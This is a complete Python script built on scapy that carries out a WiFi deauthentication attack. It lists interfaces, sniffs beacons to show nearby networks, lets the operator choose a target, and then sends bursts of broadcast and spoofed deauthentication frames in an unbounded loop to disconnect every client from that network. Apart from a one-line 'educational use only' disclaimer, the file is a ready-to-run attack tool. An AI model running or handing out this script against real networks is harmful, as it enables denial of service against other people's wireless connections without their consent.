#!/usr/bin/env python3
"""
WiFi Deauth Attack Script
WARNING: EDUCATIONAL USE ONLY - Illegal without permission!
Requires: scapy, wireless adapter with monitor mode
"""

from scapy.all import *
import sys
import time
import os

def print_banner():
    print("""
╔════════════════════════════════════════╗
║     WiFi Deauthentication Attack       ║
║     FOR EDUCATIONAL USE ONLY!          ║
╚════════════════════════════════════════╝
    """)

def get_wireless_interface():
    """Get wireless interface in monitor mode"""
    interfaces = get_if_list()
    print("\nAvailable interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"{i+1}. {iface}")
    
    choice = input("\nSelect interface (number): ")
    try:
        return interfaces[int(choice) - 1]
    except:
        print("Invalid choice!")
        sys.exit(1)

def scan_networks(iface):
    """Scan for WiFi networks"""
    print("\n[*] Scanning for networks (10 seconds)...")
    networks = {}
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            try:
                channel = int(ord(pkt[Dot11Elt:3].info))
            except:
                channel = 0
            
            if bssid not in networks and ssid:
                networks[bssid] = {'ssid': ssid, 'channel': channel}
    
    sniff(iface=iface, prn=packet_handler, timeout=10, store=0)
    
    if not networks:
        print("[!] No networks found!")
        sys.exit(1)
    
    print("\n╔════════════════════════════════════════════════════════╗")
    print("║                   AVAILABLE NETWORKS                   ║")
    print("╠════╦═══════════════════════╦════════════════════╦══════╣")
    print("║ #  ║ SSID                  ║ BSSID              ║ Ch   ║")
    print("╠════╬═══════════════════════╬════════════════════╬══════╣")
    
    network_list = list(networks.items())
    for i, (bssid, info) in enumerate(network_list, 1):
        ssid = info['ssid'][:20].ljust(20)
        ch = str(info['channel']).ljust(4)
        print(f"║ {str(i).ljust(2)} ║ {ssid} ║ {bssid} ║ {ch} ║")
    
    print("╚════╩═══════════════════════╩════════════════════╩══════╝")
    
    return network_list

def create_deauth_packet(target_mac, client_mac="FF:FF:FF:FF:FF:FF"):
    """Create deauthentication packet"""
    return RadioTap() / Dot11(
        addr1=client_mac,
        addr2=target_mac,
        addr3=target_mac
    ) / Dot11Deauth(reason=7)

def deauth_attack(iface, target_mac, ssid, count=0):
    """Perform deauthentication attack"""
    print(f"\n╔════════════════════════════════════════╗")
    print(f"║      🔥 ATTACK STARTED 🔥             ║")
    print(f"╠════════════════════════════════════════╣")
    print(f"║ Target: {ssid[:28].ljust(28)} ║")
    print(f"║ BSSID:  {target_mac.ljust(28)} ║")
    print(f"║ Mode:   Broadcast Deauth               ║")
    print(f"╚════════════════════════════════════════╝\n")
    print("[*] Press Ctrl+C to stop\n")
    
    # Create packets
    pkt1 = create_deauth_packet(target_mac, "FF:FF:FF:FF:FF:FF")
    pkt2 = create_deauth_packet(target_mac, target_mac)
    
    packets_sent = 0
    
    try:
        while count == 0 or packets_sent < count:
            # Send burst of packets
            sendp(pkt1, iface=iface, count=100, inter=0.001, verbose=0)
            sendp(pkt2, iface=iface, count=100, inter=0.001, verbose=0)
            packets_sent += 200
            
            if packets_sent % 1000 == 0:
                print(f"[+] Packets sent: {packets_sent}")
            
            time.sleep(0.01)
            
    except KeyboardInterrupt:
        print(f"\n[*] Attack stopped. Total packets sent: {packets_sent}")
        sys.exit(0)

def main():
    if os.name == 'nt':
        print("[!] This script requires Linux/macOS with monitor mode support")
        print("[!] On Windows, use the ESP8266 version instead")
        sys.exit(1)
    
    if os.geteuid() != 0:
        print("[!] This script must be run as root!")
        sys.exit(1)
    
    print_banner()
    
    # Get interface
    iface = get_wireless_interface()
    
    print(f"\n[*] Using interface: {iface}")
    print("[!] Make sure it's in monitor mode!")
    print("[!] Use: sudo airmon-ng start <interface>")
    input("\nPress Enter when ready...")
    
    # Scan networks
    network_list = scan_networks(iface)
    
    # Select target
    choice = input("\nSelect target network (number): ")
    try:
        target_idx = int(choice) - 1
        target_bssid, target_info = network_list[target_idx]
        target_ssid = target_info['ssid']
    except:
        print("[!] Invalid choice!")
        sys.exit(1)
    
    # Start attack
    deauth_attack(iface, target_bssid, target_ssid)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        sys.exit(0)
